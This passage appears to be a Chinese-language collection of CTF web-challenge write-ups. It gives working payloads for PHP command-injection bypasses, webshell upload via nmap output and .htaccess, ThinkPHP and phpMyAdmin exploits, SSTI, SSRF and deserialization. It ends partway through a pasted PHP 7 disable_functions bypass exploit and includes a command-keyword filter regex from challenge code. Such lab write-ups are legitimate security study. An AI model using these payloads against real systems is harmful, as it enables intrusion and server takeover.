md5([4,5,6]) == NULL\n```\n\n第二个利用比较时会进行类型转换，字符串`1234567a`会被强制转换类型为整型的`1234567`\n\npayload\n\n```code\n?id[]=1&gg[]=2\n\nPOST\npasswd=1234567a\n```\n\n\n\n---\n\n# [BUUCTF 2018]Online Tool\n\n源码\n\n```php\n<?php\n\nif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {\n    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];\n}\n\nif(!isset($_GET['host'])) {\n    highlight_file(__FILE__);\n} else {\n    $host = $_GET['host'];\n    $host = escapeshellarg($host);\n    $host = escapeshellcmd($host);\n    $sandbox = md5(\"glzjin\". $_SERVER['REMOTE_ADDR']);\n    echo 'you are in sandbox '.$sandbox;\n    @mkdir($sandbox);\n    chdir($sandbox);\n    echo system(\"nmap -T5 -sT -Pn --host-timeout 2 -F \".$host);\n}\n```\n\n最后有一个system函数，但是使用的nmap的指令，经过一番搜索得知了nmap可以把结果存储在文件里，所以这道题也是道RCE。还有两个没见过的函数`escapeshellarg`、`escapeshellcmd`。\n\n这道题利用了两个点\n\n1. nmap可以将扫描的结果存储在文件里。使用方法：[Nmap扫描结果的保存和输出](https://blog.csdn.net/weixin_34221036/article/details/92148628)\n\n2. escapeshellarg+escapeshellcmd同时使用有一些漏洞\n\n   > [谈谈escapeshellarg参数绕过和注入的问题](http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/)\n   >\n   > [PHP escapeshellarg()+escapeshellcmd() 之殇](https://paper.seebug.org/164/)\n\n参考博客整理一下这两个处理命令的函数同时使用时的问题：\n\n1. 假如传入的参数为`172.17.0.2' -v -d a=1`\n2. 首先经过`escapeshellarg`函数，这个函数会把单独的单引号`'`加上转义符`\\`并使用单引号`'`括起来，再使用单引号`'`把整个参数括起来。这时候的参数是`'172.17.0.2'\\'' -v -d a=1'`\n3. 再进入`escapeshellcmd`函数，这个函数（从左至右会把落单的符号直接加转义符，其他什么都不做）遇到成对匹配的单引号`'`不过处理，转义符`\\`再使用转义符转义，再略过一个成对的单引号`''`，最后一个单引号`'`再使用转义符转义。这时候的参数就成了`'172.17.0.2'\\\\'' -v -d a=1\\'`\n4. 最后执行的参数是`'172.17.0.2'\\\\'' -v -d a=1\\'`，由于中间的`\\\\`被解释为`\\`而不再是转义字符，所以后面的`'`没有被转义，与再后面的`'`配对儿成了一个空白符。所以可以简化为` 172.17.0.2\\ -v -d a=1'`\n\n所以构造payload：\n\n```code\n'<?php eval($_POST[_]) ?> -oG 1.php '\n```\n\n经过`escapeshellarg`函数会被解析成为：`''\\''<?php eval($_POST[_]) ?> -oG 1.php '\\'''`\n\n再经过`escapeshellcmd`函数会被解析为：`''\\\\''<?php eval($_POST[_]) ?> -oG 1.php '\\\\'''`\n\n注意最后单引号前面的那个空格很重要，如果是紧挨着的话文件名称就成了`1.php\\`不在是php文件了。所以我们的payload最终在服务器端是：`\\<?php eval($_POST[_]) ?> -oG 1.php \\ `。\n\n加空格目的是为了防止文件名后缀中出现符号，加上空格就会舍去。\n\n```php\n<?php\n$host = \"'<?php eval($_POST[_]) ?> -oG 1.php '\";\necho $host.\"\\n\";\n$host = escapeshellarg($host);\necho $host.\"\\n\";\n$host = escapeshellcmd($host);\necho $host.\"\\n\";\n\n```\n\n结果：\n\n```code\n'<?php eval() ?> -oG 1.php '\n''\\''<?php eval() ?> -oG 1.php '\\'''\n''\\\\''\\<\\?php eval\\(\\) \\?\\> -oG 1.php '\\\\'''\n```\n\n最终请求payload\n\n```\n/?host='<?php eval($_POST[_]) ?> -oG 1.php '\n```\n\n执行指令时会创建一个sandbox文件夹，访问`$sandbox$/1.php`，POST传参\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110615.png)\n\n```\n_=system('cat /flag');\n```\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110726.png)\n\n\n\n---\n\n# [RoarCTF 2019]Easy Java\n\n是java写的web程序\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110821.png)\n\n考点是**WEB-INF/web.xml泄露**\n\n> WEB-INF主要包含一下文件或目录: \n>\n> /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。\n>\n> /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中 \n>\n> /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件 \n>\n> /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。 \n>\n> /WEB-INF/database.properties：数据库配置文件 \n>\n> 漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码\n\n重点不在登陆界面，而是那个Help按钮，可以下载文件。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110934.png)\n\n首先尝试去读web.xml文档，添加POST请求\n\n```\nfilename=WEB-INF/web.xml\n```\n可以读取web.xml文件：\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\"\n         version=\"4.0\">\n\n    <welcome-file-list>\n        <welcome-file>Index</welcome-file>\n    </welcome-file-list>\n\n    <servlet>\n        <servlet-name>IndexController</servlet-name>\n        <servlet-class>com.wm.ctf.IndexController</servlet-class>\n    </servlet>\n    <servlet-mapping>\n        <servlet-name>IndexController</servlet-name>\n        <url-pattern>/Index</url-pattern>\n    </servlet-mapping>\n\n    <servlet>\n        <servlet-name>LoginController</servlet-name>\n        <servlet-class>com.wm.ctf.LoginController</servlet-class>\n    </servlet>\n    <servlet-mapping>\n        <servlet-name>LoginController</servlet-name>\n        <url-pattern>/Login</url-pattern>\n    </servlet-mapping>\n\n    <servlet>\n        <servlet-name>DownloadController</servlet-name>\n        <servlet-class>com.wm.ctf.DownloadController</servlet-class>\n    </servlet>\n    <servlet-mapping>\n        <servlet-name>DownloadController</servlet-name>\n        <url-pattern>/Download</url-pattern>\n    </servlet-mapping>\n\n    <servlet>\n        <servlet-name>FlagController</servlet-name>\n        <servlet-class>com.wm.ctf.FlagController</servlet-class>\n    </servlet>\n    <servlet-mapping>\n        <servlet-name>FlagController</servlet-name>\n        <url-pattern>/Flag</url-pattern>\n    </servlet-mapping>\n\n</web-app>\n```\n\n注意到了一个`FlagController`的控制器，它所在的类为`com.wm.ctf.FlagController`，前面也提到了编译文件所在的文件夹`/WEB-INF/classes/`，去这个文件夹下载`FlagController`相关的文件，还需要知道的是：Javaweb程序编译文件的目录结构是根据类名创建的，类名我们也知道了，所以下载：\n\n```code\nfilename=WEB-INF/classes/com/wm/ctf/FlagController.class\n```\n\nclass文件源码好多不可见字符\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310112205.png)\n\n我选中的那段就是flag在的地方，看到了`==`就应该意识到是base64编码，但是base64编码里没有`<`这个字符，所以flag的密文就是\n\n```code\nZmxhZ3s0NmNhMTExMS01ZjI5LTQwYjMtYjUwMC1lYWMzZjkyMjU4ODF9Cg==\n```\n\n\n\n---\n\n#  -----------------------以下部分施工中👷‍♂️------------------------\n\n下面的都是没有整理，先把重要思路写下来了，然后有时间再配图\n\n---\n\n# [GKCTF2020]cve版签到\n\n[CVE-2020-7066](https://blog.csdn.net/qq_45521281/article/details/106425266)\n\n只有一个按钮，点击以后查看网页的Network请求中有一个\n\n> Hint: Flag in localhost\n\n且utl地址中有可控的参数，所以应该是使用ssrf。这里还有一个提示是在主页面那里\n\n>You just view *.ctfhub.com\n\n只可以访问以ctfhub.com结尾的网站，再根据cve使用%00截断访问：\n\n```\n?url=http://127.0.0.1%00.ctfhub.com\n```\n\n第二个提示：\n\n> Host must be end with '123'\n\n必须以123结尾，所以最终payload\n\n```\n?url=http://127.0.0.123%00.ctfhub.com\n```\n\n\n\n---\n\n# [GXYCTF2019]禁止套娃\n\ngit泄露。我使用的https://github.com/gakki429/Git_Extract\n\n```\n<?php\ninclude \"flag.php\";\necho \"flag在哪里呢？<br>\";\nif(isset($_GET['exp'])){\n    if (!preg_match('/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i', $_GET['exp'])) {\n        if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp'])) {\n            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {\n                // echo $_GET['exp'];\n                @eval($_GET['exp']);\n            }\n            else{\n                die(\"还差一点哦！\");\n            }\n        }\n        else{\n            die(\"再好好想想！\");\n        }\n    }\n    else{\n        die(\"还想读flag，臭弟弟！\");\n    }\n}\n// highlight_file(__FILE__);\n?>\n\n```\n\n正则表达式匹配的只有函数的形式如`var_dump();`是一道[无参数RCE](https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/)，看的题解自己整理的payload：\n\n```\n?exp=var_dump(readfile(array_rand(array_flip(scandir(current(localeconv()))))));\n```\n\n一层一层解释：\n\nlocaleconv() 函数返回一包含本地数字及货币格式信息的数组\n\n**图片展示**\n\ncurrent() 返回数组中的当前单元, 默认取第一个值。别名pos()\n\n到这里获得的是一个点\n\n\n\nscandir() 遍历目录，是`.`的话就是列出当前目录。\n\n此时输出：\n\n```\narray(5) { [0]=> string(1) \".\" [1]=> string(2) \"..\" [2]=> string(4) \".git\" [3]=> string(8) \"flag.php\" [4]=> string(9) \"index.php\" }\n```\n\n这时的输出还是键值对的形式，我们需要使用`array_flip()`函数交换键值对，然后使用随机函数`array_rand()`从数组中随机取出一个或多个单元。因为正则的原因无法使用`file_get_contents()`，但是还有其他读取文件的函数:readfile()、highlight_file()和它的别名函数show_source()。\n\n\n\n---\n\n# [GXYCTF2019]BabyUpload\n\nph过滤，image/gif不能通过。image/jpe可以\n\n上传.htaccess\n\n```\nSetHandler application/x-httpd-php\n```\n\n上传码，但是不能是php代码，使用js\n\n```\n<script language=\"php\">eval($_REQUEST[shell])</script>\n```\n\n完工\n\n---\n\n# [BJDCTF 2nd]old-hack\n\nThinkPHP的[漏洞](https://blog.csdn.net/qq_38807738/article/details/86777541)\n\nThinkPHP5 5.0.23\n\n```\n_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=cat /flag\n```\n\n\n\n---\n\n# [安洵杯 2019]easy_web\n\n看url一个img和cmd，页面中有一个图片的标签，和一个**md5 is funny ~**。把url中img的值进行解码发现图片名为`555.png`，尝试用同样的编码方式读取index.php，加密的编码依次为：hex-->base64-->base64。\n\nindex.php\n\n```\n<?php\nerror_reporting(E_ALL || ~ E_NOTICE);\nheader('content-type:text/html;charset=utf-8');\n$cmd = $_GET['cmd'];\nif (!isset($_GET['img']) || !isset($_GET['cmd'])) \n    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');\n$file = hex2bin(base64_decode(base64_decode($_GET['img'])));\n\n$file = preg_replace(\"/[^a-zA-Z0-9.]+/\", \"\", $file);\nif (preg_match(\"/flag/i\", $file)) {\n    echo '<img src =\"./ctf3.jpeg\">';\n    die(\"xixi～ no flag\");\n} else {\n    $txt = base64_encode(file_get_contents($file));\n    echo \"<img src='data:image/gif;base64,\" . $txt . \"'></img>\";\n    echo \"<br>\";\n}\necho $cmd;\necho \"<br>\";\nif (preg_match(\"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\&[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|<|>/i\", $cmd)) {\n    echo(\"forbid ~\");\n    echo \"<br>\";\n} else {\n    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {\n        echo `$cmd`;\n    } else {\n        echo (\"md5 is funny ~\");\n    }\n}\n\n?>\n<html>\n<style>\n  body{\n   background:url(./bj.png)  no-repeat center center;\n   background-size:cover;\n   background-attachment:fixed;\n   background-color:#CCCCCC;\n}\n</style>\n<body>\n</body>\n</html>\n```\n\n\n\n我不知道为什么，我的bp一定要在`&`前加一个空格才可以通过。\n\n```\n?cmd=uniq%20/flag\n\nPOST\na=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2\n&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2\n```\n\n读文件的绕过有\n\n> |  1   | more:一页一页的显示档案内容                                  |\n> | :--: | ------------------------------------------------------------ |\n> |  2   | less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页 |\n> |  3   | head:查看头几行                                              |\n> |  4   | tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示       |\n> |  5   | tail:查看尾几行                                              |\n> |  6   | nl：显示的时候，顺便输出行号                                 |\n> |  7   | od:以二进制的方式读取档案内容                                |\n> |  8   | vi:一种编辑器，这个也可以查看                                |\n> |  9   | vim:一种编辑器，这个也可以查看                               |\n> |  10  | sort:可以查看                                                |\n> |  11  | uniq:可以查看                                                |\n> |  12  | file -f:报错出具体内容                                       |\n\n摘自[命令执行漏洞利用及绕过方式总结](https://www.ghtwf01.cn/index.php/archives/273/)。\n\n---\n\n# [BJDCTF2020]Mark loves cat\n\ngit泄露\n\nflag.php\n\n```\n<?php\n\n$flag = file_get_contents('/flag');\n```\n\nindex.php\n\n```\n<?php\n\ninclude 'flag.php';\n\n$yds = \"dog\";\n$is = \"cat\";\n$handsome = 'yds';\n\nforeach($_POST as $x => $y){\n    $$x = $y;\n}\n\nforeach($_GET as $x => $y){\n    $$x = $$y;\n}\n\nforeach($_GET as $x => $y){\n    if($_GET['flag'] === $x && $x !== 'flag'){\n        exit($handsome);\n    }\n}\n\nif(!isset($_GET['flag']) && !isset($_POST['flag'])){\n    exit($yds); \n}\n\nif($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){\n    exit($is);\n}\n\n\n\necho \"the flag is: \".$flag;\n```\n\n尝试输出`$flag`即可。exit()函数退出时也会输出。\n\n第一个不可能实现，如果POST或GET传入flag的话必然导致`$flag`修改，那么正好符合第二个if。\n\npayload\n\n```\nGET\n?yds=flag\n\nPOST(任意，但是需要保证不传flag)\nis=233flag\n```\n\n\n\n---\n\n# [BJDCTF2020]The mystery of ip\n\nhint.php里面有注释\n\n> Do you know why i know your ip?\n\n去flag.php尝试加入请求头x-forward-x、client-ip发现ip可以改变。然后是自己感觉网页很简单，突破点在请求头中，尝试了下ssti模板注入，发现成功了。\n\n尝试了几个ssti的payload不行，但是提示了\n\n> Uncaught --> Smarty Compiler:.....................\n\n得知了这个是Smarty引擎，在网上尝试搜索这种类型的注入\n\n```\n请求：\nX-Forwarded-For: {system('cat /flag')}\n```\n\n\n\n[SSTI神器–Tplmap](https://github.com/epinna/tplmap)，看介绍是和sqlmap差不多的工具。\n\n这个师傅的博客写的很全：https://www.cnblogs.com/R3col/p/12746485.html，所有类型的模板引擎payload都有，注入之前需要先确定类型。\n\n[CTF SSTI(服务器模板注入)](https://www.cnblogs.com/20175211lyz/p/11425368.html)\n\n[flask之ssti模版注入从零到入门](https://xz.aliyun.com/t/3679/)\n\n---\n\n# [GWCTF 2019]我有一个数据库\n\n页面是乱码，想知道内容了可以看下图\n\n$$各种乱码图\n\n对照的是古文码。是以GBK方式读取UTF-8编码的中文，我举个例子，使用vscode，先通过编码保存-->GBK，再通过编码打开-->UTF-8。内容如下\n\n> 我有一个数据库，但里面什么也没有~\n> 不信你找\n\n提示是数据库了，那么果断尝试PHPmyadmin，访问成功，然后查看下版本，去网上搜索对应版本的漏洞\n\n[phpmyadmin4.8.1后台getshell](https://www.secpulse.com/archives/72817.html)\n\npayload\n\n```\n/phpmyadmin/index.php?target=db_sql.php%253f../../../../../../flag\n```\n\n可以包含任意文件，理应可以包含数据库文件，在数据库表字段写shell，没成不知道数据库文件名称\n\n\n\n---\n\n# 2021.03.01\n\n---\n\n# [BJDCTF2020]ZJCTF，不过如此\n\n绕过\n\n第一层用php伪协议中的data封装流。[PHP伪协议总结](https://segmentfault.com/a/1190000018991087)\n\n然后进入文件包含，提示包含next.php文件，还是使用php伪协议中的php://filter\n\npayload\n\n```\n?text=data://text/plain,I have a dream&file=php://filter/convert.base64-encode/resource=next.php\n```\n\n读出来的next.php\n\n```\nPD9waHAKJGlkID0gJF9HRVRbJ2lkJ107CiRfU0VTU0lPTlsnaWQnXSA9ICRpZDsKCmZ1bmN0aW9uIGNvbXBsZXgoJHJlLCAkc3RyKSB7CiAgICByZXR1cm4gcHJlZ19yZXBsYWNlKAogICAgICAgICcvKCcgLiAkcmUgLiAnKS9laScsCiAgICAgICAgJ3N0cnRvbG93ZXIoIlxcMSIpJywKICAgICAgICAkc3RyCiAgICApOwp9CgoKZm9yZWFjaCgkX0dFVCBhcyAkcmUgPT4gJHN0cikgewogICAgZWNobyBjb21wbGV4KCRyZSwgJHN0cikuICJcbiI7Cn0KCmZ1bmN0aW9uIGdldEZsYWcoKXsKCUBldmFsKCRfR0VUWydjbWQnXSk7Cn0K\n```\n\nbase64解码：\n\n```\n<?php\n$id = $_GET['id'];\n$_SESSION['id'] = $id;\n\nfunction complex($re, $str) {\n    return preg_replace(\n        '/(' . $re . ')/ei',\n        'strtolower(\"\\\\1\")',\n        $str\n    );\n}\n\n\nforeach($_GET as $re => $str) {\n    echo complex($re, $str). \"\\n\";\n}\n\nfunction getFlag(){\n\t@eval($_GET['cmd']);\n}\n\n```\n\n这里想要通过需要知道一个[深入研究 preg_replace /e 模式下的代码漏洞问题](http://www.xinyueseo.com/websecurity/158.html)\n\n最终payload\n\n```\nnext.php?\\S*=${getFlag()}&cmd=system('cat /flag');\n```\n\n\n\n---\n\n# [De1CTF 2019]SSRF Me\n\n进入页面是一堆源码，之前写过flask的可以大概理出来几个重要的点，但是还是贴一下源码\n\n```python\n#! /usr/bin/env python\n# encoding=utf-8\nfrom flask import Flask\nfrom flask import request\nimport socket\nimport hashlib\nimport urllib\nimport sys\nimport os\nimport json\n\nreload(sys)\nsys.setdefaultencoding('latin1')\n\napp = Flask(__name__)\n\nsecert_key = os.urandom(16)\n\n\nclass Task:\n    def __init__(self, action, param, sign, ip):\n        self.action = action\n        self.param = param\n        self.sign = sign\n        self.sandbox = md5(ip)\n        if (not os.path.exists(self.sandbox)):  # SandBox For Remote_Addr\n            os.mkdir(self.sandbox)\n\n    def Exec(self):\n        result = {}\n        result['code'] = 500\n        if (self.checkSign()):\n            if \"scan\" in self.action:\n                tmpfile = open(\"./%s/result.txt\" % self.sandbox, 'w')\n                resp = scan(self.param)  # 此处是文件读取得注入点\n                if (resp == \"Connection Timeout\"):\n                    result['data'] = resp\n                else:\n                    print resp\n                    tmpfile.write(resp)\n                    tmpfile.close()\n                result['code'] = 200\n            if \"read\" in self.action:\n                f = open(\"./%s/result.txt\" % self.sandbox, 'r')\n                result['code'] = 200\n                result['data'] = f.read()\n            if result['code'] == 500:\n                result['data'] = \"Action Error\"\n        else:\n            result['code'] = 500\n            result['msg'] = \"Sign Error\"\n        return result\n\n    def checkSign(self):\n        if (getSign(self.action, self.param) == self.sign):\n            return True\n        else:\n            return False\n\n\n# generate Sign For Action Scan.\n@app.route(\"/geneSign\", methods=['GET', 'POST'])\ndef geneSign():\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    action = \"scan\"\n    return getSign(action, param)\n\n\n@app.route('/De1ta', methods=['GET', 'POST'])\ndef challenge():\n    action = urllib.unquote(request.cookies.get(\"action\"))\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    sign = urllib.unquote(request.cookies.get(\"sign\"))\n    ip = request.remote_addr\n    if (waf(param)):\n        return \"No Hacker!!!!\"\n    task = Task(action, param, sign, ip)\n    return json.dumps(task.Exec())\n\n\n@app.route('/')\ndef index():\n    return open(\"code.txt\", \"r\").read()\n\n\ndef scan(param):\n    socket.setdefaulttimeout(1)\n    try:\n        return urllib.urlopen(param).read()[:50]\n    except:\n        return \"Connection Timeout\"\n\n\ndef getSign(action, param):\n    return hashlib.md5(secert_key + param + action).hexdigest()\n\n\ndef md5(content):\n    return hashlib.md5(content).hexdigest()\n\n\ndef waf(param):\n    check = param.strip().lower()\n    if check.startswith(\"gopher\") or check.startswith(\"file\"):\n        return True\n    else:\n        return False\n\n\nif __name__ == '__main__':\n    app.debug = False\n    app.run(host='0.0.0.0')\n```\n\n简单说明思路：\n\n请求部分(代码69-78)：\n\n| 获取的param是需要打开文件的名称，提示中已经写出flag在flag.txt。根据使用函数，可以使用get传参 |\n| ------------------------------------------------------------ |\n| 读取文件需要在cookie里传入参数action、sign                   |\n| action是执行类型，代码33行和43行指出了两种。                 |\n| sing是用来验证param和action的，相关函数在94行，稍后做解释    |\n\n获取sign部分(61-66)\n\n| 获取param，action固定为scan                 |\n| ------------------------------------------- |\n| 返回(secert_key + param + action)组合的sign |\n\n所以我们需要先获取sign，获取sign时包含的param和action，再去请求文件获得flag，并且获取flag时会验证sign是否符合格式(代码32行、54-58行)。因为获取sign时action固定为scan(代码65)，但是请求中我们需要使用read才可以访问，所以构造payload。\n\n假如param=flag.txt，获取sign时action固定值为scan，此时的sign为(使用`|`仅为说明使用，其实字符串是相连的)\n\n```\nsecert_key|flag.txt|scan\n```\n\n但是我们想要使用read，可以构造param为flag.txtread\n\n```\nsecert_key|flag.txtread|scan\n```\n\n再进行验证的时候我们传入param为flag.txt，action为readscan即可符合格式。\n\n```\nsecert_key|flag.txt|readscan\n```\n\n请求/geneSign\n\n```\n/geneSign?param=flag.txtread\n```\n\n得到\n\n```\n9017a8826b7267833f22c0f22d90fea7\n```\n\n得到sign以后，再去访问/De1ta\n\n```\n/De1ta?param=flag.txt\n\nsign=9017a8826b7267833f22c0f22d90fea7;action=readscan;\n```\n\n获得flag\n\n---\n\n# [网鼎杯 2020 朱雀组]phpweb\n\n看源码，有一个表单和自动提交的js。表单参数为\n\n```\nfunc=date&p=Y-m-d+h%3Ai%3As+a\n```\n\n是一个获取时间的函数。尝试注入点func是函数，就试试常见的读取文件函数readfile可以读取index.php\n\n```\n<?php\n    $disable_fun = array(\"exec\",\"shell_exec\",\"system\",\"passthru\",\"proc_open\",\"show_source\",\"phpinfo\",\"popen\",\"dl\",\"eval\",\"proc_terminate\",\"touch\",\"escapeshellcmd\",\"escapeshellarg\",\"assert\",\"substr_replace\",\"call_user_func_array\",\"call_user_func\",\"array_filter\", \"array_walk\",  \"array_map\",\"registregister_shutdown_function\",\"register_tick_function\",\"filter_var\", \"filter_var_array\", \"uasort\", \"uksort\", \"array_reduce\",\"array_walk\", \"array_walk_recursive\",\"pcntl_exec\",\"fopen\",\"fwrite\",\"file_put_contents\");\n    function gettime($func, $p) {\n        $result = call_user_func($func, $p);\n        $a= gettype($result);\n        if ($a == \"string\") {\n            return $result;\n        } else {return \"\";}\n    }\n    class Test {\n        var $p = \"Y-m-d h:i:s a\";\n        var $func = \"date\";\n        function __destruct() {\n            if ($this->func != \"\") {\n                echo gettime($this->func, $this->p);\n            }\n        }\n    }\n    $func = $_REQUEST[\"func\"];\n    $p = $_REQUEST[\"p\"];\n\n    if ($func != null) {\n        $func = strtolower($func);\n        if (!in_array($func,$disable_fun)) {\n            echo gettime($func, $p);\n        }else {\n            die(\"Hacker...\");\n        }\n    }\n    ?>\n```\n\n我没思路了，看的网上wp。使用了反序列化unserialize，实在是太斯巴拉西了。\n\n先构造Test对象，对象销毁时也会执行gettime函数执行payload，记得要加一层urlencode，不然会被拦下\n\n```\n<?php\n    class Test {\n        var $p = \"ls ../../../../\";\n        \n        var $func = \"system\";\n    }\n$s=new Test();\necho urlencode(serialize($s));\n#unserialize\n\nO%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A15%3A%22ls+..%2F..%2F..%2F..%2F%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7D\n```\n\nwp使用的是find指令找的flag地址，但是我执行以后出现503，应该是服务器防火墙阳气过盛，但是使用ls的方法一个一个找也能找得到。flag在/tmp/flagoefiu4r93\n\n```\nPOST\nfunc=unserialize&p=O%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A18%3A%22ls+..%2F..%2F..%2F..%2Ftmp%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7D\n```\n\n最后读文件\n\n```\nfunc=readfile&p=../../../../tmp/flagoefiu4r93\n```\n\n\n\n---\n\n# [GKCTF2020]CheckIN\n\n是用base64解码执行代码，使用Ginkgo接收，GET、POST都可以\n\n```\nphpinfo();\ncGhwaW5mbygpOw==\n```\n\n查看php版本和disable_function，被禁用一大堆，包括好多命令执行函数\n\n可以使用print_r()、var_dump()输出，scandir()看目录，file_get_contents()读文件内容。\n\nscandir根目录查看\n\n```\n?Ginkgo=cHJpbnRfcihzY2FuZGlyKCcuLi8uLi8uLi8uLi8nKSk7\n```\n\n又一个flag读不出来，但是还有一个readflag可以读出来，文件前缀是ELF，百度以后知道是linux的可执行文件\n\n传码\n\n```\neval($_POST[1]);\nZXZhbCgkX1BPU1RbMV0pOw==\n```\n\n蚁剑连接。但是system()被禁，只能使用disable_function绕过，之前有一道[RCE ME](https://braindance.tk/2020/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DRCE%20ME/)也是用绕过，但是在这道题不管用了。在网上看wp知道了另一种，利用php7堆溢出触发，我修改了下payload部分(11行)：\n\n```\n<?php\n\n# PHP 7.0-7.3 disable_functions bypass PoC (*nix only)\n#\n# Bug: https://bugs.php.net/bug.php?id=72530\n#\n# This exploit should work on all PHP 7.0-7.3 versions\n#\n# Author: https://github.com/mm0r1\n\npwn(\"../../.././readflag\");   #这里是想要执行的命令\n\nfunction pwn($cmd) {\n    global $abc, $helper;\n\n    function str2ptr(&$str, $p = 0, $s = 8) {\n        $address = 0;\n        for($j = $s-1; $j >= 0; $j--) {\n            $address <<= 8;\n            $address |= ord($str[$p+$j]);\n        }\n        return $address;\n    }\n\n    function ptr2str($ptr, $m = 8) {\n        $out = \"\";\n        for ($i=0; $i < $m; $i++) {\n            $out .= chr($ptr & 0xff);\n            $ptr >>= 8;\n        }\n        return $out;\n    }\n\n    function write(&$str, $p, $v, $n = 8) {\n        $i = 0;\n        for($i = 0; $i < $n; $i++) {\n            $str[$p + $i] = chr($v & 0xff);\n            $v >>= 8;\n        }\n    }\n\n    function leak($addr, $p = 0, $s = 8) {\n        global $abc, $helper;\n        write($abc, 0x68, $addr + $p - 0x10);\n        $leak = strlen($helper->a);\n        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }\n        return $leak;\n    }\n\n    function parse_elf($base) {\n        $e_type = leak($base, 0x10, 2);\n\n        $e_phoff = leak($base, 0x20);\n        $e_phentsize = leak($base, 0x36, 2);\n        $e_phnum = leak($base, 0x38, 2);\n\n        for($i = 0; $i < $e_phnum; $i++) {\n            $header = $base + $e_phoff + $i * $e_phentsize;\n            $p_type  = leak($header, 0, 4);\n            $p_flags = leak($header, 4, 4);\n            $p_vaddr = leak($header, 0x10);\n            $p_memsz = leak($header, 0x28);\n\n            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write\n                # handle pie\n                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;\n                $data_size = $p_memsz;\n            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec\n                $text_size = $p_memsz;\n            }\n        }\n\n        if(!$data_addr || !$text_size || !$data_size)\n            return false;\n\n        return [$data_addr, $text_size, $data_size];\n    }\n\n    function get_basic_funcs($base, $elf) {\n        list($data_addr, $text_size, $data_size) = $elf;\n        for($i = 0; $i < $data_size / 8; $i++) {\n            $leak = leak($data_addr, $i * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                # 'constant' constant check\n                if($deref != 0x746e6174736e6f63)\n                    continue;\n            } else continue;\n\n            $leak = leak($data_addr, ($i + 4) * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                # 'bin2hex' constant check\n                if($deref != 0x786568326e6962)\n                    continue;\n            } else continue;\n\n            return $data_addr + $i * 8;\n        }\n    }\n\n    function get_binary_base($binary_leak) {\n        $base = 0;\n        $start = $binary_leak & 0xfffffffffffff000;\n        for($i = 0; $i < 0x1000; $i++) {\n            $addr = $start - 0x1000 * $i;\n            $leak = leak($addr, 0, 7);\n            if($leak == 0x10102464c457f) { # ELF header\n                return $addr;\n            }\n        }\n    }\n\n    function 